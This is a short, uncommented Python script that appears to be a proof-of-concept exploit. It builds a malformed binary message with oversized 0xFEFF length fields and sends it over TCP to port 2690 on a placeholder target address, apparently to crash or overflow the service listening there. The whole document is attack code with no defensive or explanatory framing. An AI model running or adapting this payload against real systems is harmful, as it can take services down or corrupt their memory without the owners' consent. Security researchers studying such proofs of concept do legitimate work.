#!python
import socket
import struct

a =  struct.pack('<b', 2)
a += struct.pack('<H', 0)
a += struct.pack('<H',0xFEFF)
a += struct.pack('<H',0xFEFF)
a += "1234"

target_ip = 'X.X.X.X'

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect ((target_ip, 2690))

s.send(a)
s.close()
